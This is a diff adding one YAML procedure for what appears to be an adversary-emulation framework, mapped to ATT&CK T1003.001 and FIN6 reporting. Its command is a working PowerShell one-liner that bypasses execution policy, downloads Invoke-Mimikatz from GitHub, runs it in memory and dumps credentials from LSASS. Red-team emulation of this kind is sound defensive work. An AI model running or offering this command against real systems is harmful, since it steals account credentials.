@@ -1,0 +1,15 @@
+- id: ff77db3d-ded1-48da-9885-8dfc097edec0
+  name: PowerSploit Invoke-Mimikatz
+  description: Dump credentials from memory via PowerShell by invoking a remote Mimikatz script, similar to the procedure used by FIN6.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory - Invoke-Mimikatz'
+  cti_source: https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/
+  procedure_group: procedure_privesc
+  procedure_step: '3.2'
+  platforms:
+    windows:
+      psh:
+        command: |
+          powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
